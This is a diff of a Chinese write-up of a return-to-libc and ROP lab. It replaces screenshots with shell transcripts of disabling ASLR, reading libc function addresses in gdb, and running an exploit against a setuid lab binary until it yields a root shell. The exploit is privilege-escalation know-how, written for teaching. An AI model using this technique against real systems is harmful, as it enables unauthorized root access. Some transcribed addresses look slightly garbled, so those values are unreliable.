@@ -16,19 +16,19 @@ copyrights: 原创
 
 ## 实验原理
 
-<img src="/assets/post/images/return2libc1.webp" alt="return2libc1" style="zoom: 67%;" />
+<img src="/assets/post/images/return2libc1.svg" alt="return2libc1" style="width:min(100%,500px);" />
 
 ## Task 1: Finding out the Addresses of libc Functions
 
 关闭地址随机化
 
-```bash
+```shell
 sudo sysctl -w kernel.randomize_va_space=0
 ```
 
 修改链接
 
-```bash
+```shell
 sudo ln -sf /bin/zsh /bin/sh
 ```
 
@@ -47,13 +47,22 @@ gdb-peda$ quit
 
 得到结果
 
-<img src="/assets/post/images/return2libc2.webp" alt="return2libc2" style="zoom:50%;" />
+```shell
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xf4e12420 <system>
+gdb-peda$ p exit
+$2 = {<text variable, no debug info>} 0xf4e4f80 <exit>
+```
 
 ## Task 2: Putting the shell string in the memory
 
-新建 MYSHELL 环境变量
+新建 `MYSHELL` 环境变量
 
-<img src="/assets/post/images/return2libc3.webp" alt="return2libc3" style="zoom:50%;" />
+```shell
+$ export MYSHELL=/bin/sh
+$ env | grep MYSHELL
+MYSHELL=/bin/sh
+```
 
 编写程序 `prtenv.c`
 
@@ -72,7 +81,21 @@ void main(){
 
 由于 prtenv 和 retlib 都是 6 个字母，所以会得到同样的结果，如下所示。
 
-<img src="/assets/post/images/return2libc4.webp" alt="return2libc4" style="zoom:50%;" />
+```shell
+$ gcc -m32 -fno-stack-protector -z execstack -o prtenv prtenv.c
+$ ./prtenv
+ffffd403
+$ make
+gcc -m32 -DBUF_SIZE=12 -fno-stack-protector -z noexecstack -o retlib retlib.c
+sudo chown root retlib && sudo chmod 4755 retlib
+$ ./retlib
+ffffd403
+Address of input[] inside main(): 0xffffcd9c
+Input size: 0
+Address of buffer[] inside bof(): 0xffffcd60
+Frame Pointer value inside bof(): 0xffffcd78
+Segmentation fault
+```
 
 ## Task 3: Launching the Attack
 
@@ -106,14 +129,31 @@ with open("badfile", "wb") as f:
 
 运行，攻击成功
 
-<img src="/assets/post/images/return2libc5.webp" alt="return2libc5" style="zoom:50%;" />
+```shell
+$ ./exploit.py
+$ ./retlib
+Address of input[] inside main():  0xffffcda0
+Input size: 300
+Address of buffer[] inside bof():  0xffffcd70
+Frame Pointer value inside bof():  0xffffcd88
+#
+```
 
 > **Attack variation 1:** Is the `exit()` function really necessary? Please try your attack without including
 > the address of this function in badfile. Run your attack again, report and explain your observations.
 
 根据 task 要求，我们将 exploit.py 中 exit 的部分注释掉，然后重新运行。
 
-<img src="/assets/post/images/return2libc6.webp" alt="return2libc6" style="zoom:50%;" />
+```shell
+$ ./exploit.py
+$ ./retlib
+Address of input[] inside main():  0xffffcda0
+Input size: 300
+Address of buffer[] inside bof():  0xffffcd70
+Frame Pointer value inside bof():  0xffffcd88
+# exit
+Segmentation fault
+```
 
 发现可以正常提权，但退出时会崩溃。
 
@@ -124,11 +164,25 @@ with open("badfile", "wb") as f:
 
 根据 task 要求，我们先将编译后的二进制文件改名为 rrtlib，提权成功
 
-<img src="/assets/post/images/return2libc7.webp" alt="return2libc7" style="zoom:50%;" />
+```shell
+$ ./rrtlib
+Address of input[] inside main():  0xffffcda0
+Input size: 300
+Address of buffer[] inside bof():  0xffffcd70
+Frame Pointer value inside bof():  0xffffcd88
+#
+```
 
 在改为 newretlib，提权不成功
 
-<img src="/assets/post/images/return2libc8.webp" alt="return2libc8" style="zoom:50%;" />
+```shell
+$ ./newretlib
+Address of input[] inside main():  0xffffcd90
+Input size: 300
+Address of buffer[] inside bof():  0xffffcd60
+Frame Pointer value inside bof():  0xffffcd78
+zsh:1: command not found: h
+```
 
 由此可见，这与程序名的长度有关。
 
@@ -136,17 +190,26 @@ with open("badfile", "wb") as f:
 
 改回链接
 
-```bash
+```shell
 sudo ln -sf /bin/dash /bin/sh
 ```
 
 为了使攻击更加方便，我们直接使用 ROP。首先获取所需要的 libc 函数地址
 
-<img src="/assets/post/images/return2libc9.webp" alt="return2libc9" style="zoom:50%;" />
+```shell
+gdb-peda$ p sprintf
+$1 = {<text variable, no debug info>} 0xf7e20e40 <sprintf>
+gdb-peda$ p setuid
+$2 = {<text variable, no debug info>} 0xf7e99e30 <setuid>
+gdb-peda$ p system
+$3 = {<text variable, no debug info>} 0xf7e12420 <system>
+gdb-peda$ p exit
+$4 = {<text variable, no debug info>} 0xf7e4f80 <exit>
+```
 
 然后 `disas bof` 获取 `bof()` 函数返回地址
 
-<img src="/assets/post/images/return2libc10.webp" alt="return2libc10" style="zoom:50%;" />
+<img src="/assets/post/images/return2libc2.webp" alt="return2libc2" style="width:min(100%,600px);" />
 
 同时我们还有 retlib 打印出的 `bof()` 函数 ebp 位置和 MYSHELL 地址，根据这些修改 exploit.py
 
@@ -222,7 +285,20 @@ with open("badfile", "wb") as f:
 
 运行程序，可以看到成功提权
 
-<img src="/assets/post/images/return2libc11.webp" alt="return2libc11" style="zoom:50%;" />
+```shell
+$ make
+gcc -m32 -DBUF_SIZE=12 -fno-stack-protector -z noexecstack -o retlib retlib.c
+sudo chown root retlib && sudo chmod 4755 retlib
+$ ./exploit.py
+$ ./retlib
+ffffd3e3
+Address of input[] inside main():  0xffffcd7c
+Input size: 256
+Address of buffer[] inside bof():  0xffffcd40
+Frame Pointer value inside bof():  0xffffcd58
+# whoami
+root
+```
 
 ## Task 5: Return-Oriented Programming
 
@@ -230,9 +306,12 @@ with open("badfile", "wb") as f:
 
 先获取 `foo()` 地址
 
-<img src="/assets/post/images/return2libc12.webp" alt="return2libc12" style="zoom:50%;" />
+```shell
+gdb-peda$ p foo
+$1 = {<text variable, no debug info>} 0x565562d0 <foo>
+```
 
-然后修改 exploit.py
+然后修改 `exploit.py`
 
 ```python
 ## !/usr/bin/python3
@@ -309,7 +388,27 @@ with open("badfile", "wb") as f:
 
 运行程序，可以看到调用了 10 次 `foo()` ，并成功提权
 
-<img src="/assets/post/images/return2libc13.webp" alt="return2libc13" style="zoom:50%;" />
+```shell
+$ ./exploit.py
+$ ./retlib
+ffffd3e3
+Address of input[] inside main():  0xffffcd7c
+Input size: 576
+Address of buffer[] inside bof():  0xffffcd40
+Frame Pointer value inside bof():  0xffffcd58
+Function foo() is invoked 1 times
+Function foo() is invoked 2 times
+Function foo() is invoked 3 times
+Function foo() is invoked 4 times
+Function foo() is invoked 5 times
+Function foo() is invoked 6 times
+Function foo() is invoked 7 times
+Function foo() is invoked 8 times
+Function foo() is invoked 9 times
+Function foo() is invoked 10 times
+# whoami
+root
+```
 
 ## 实验总结
 
